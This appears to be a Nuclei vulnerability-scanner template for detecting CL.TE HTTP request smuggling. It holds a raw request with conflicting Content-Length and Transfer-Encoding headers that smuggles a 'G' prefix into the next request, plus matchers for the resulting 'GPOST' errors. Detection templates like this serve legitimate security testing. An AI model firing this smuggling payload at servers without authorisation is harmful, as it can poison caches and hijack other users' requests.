id: http-request-smuggling-clte

info:
  name: HTTP Request Smuggling - CL.TE
  author: FaizanAnwar01
  severity: medium
  description: |
    The server may be vulnerable to HTTP Request Smuggling (CL.TE variant).
    The front-end server uses the Content-Length header while the back-end server
    uses the Transfer-Encoding header, allowing an attacker to smuggle a second
    request within the body of the first. This can lead to cache poisoning,
    bypassing security controls, or hijacking other users' requests.
  reference:
    - https://portswigger.net/web-security/request-smuggling
    - https://cwe.mitre.org/data/definitions/444.html
    - https://hackerone.com/reports/215170
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-444
  metadata:
    verified: true
    max-request: 1
  tags: http,smuggling,clte,misconfig

http:
  - raw:
      - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        G

    unsafe: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Unrecognized method GPOST"
          - "Not Implemented"
          - "Method Not Allowed"
          - "Invalid method"
          - "Unknown HTTP method"
          - "501 GPOST"
        condition: or

      - type: status
        status:
          - 400
          - 405
          - 501
        condition: or
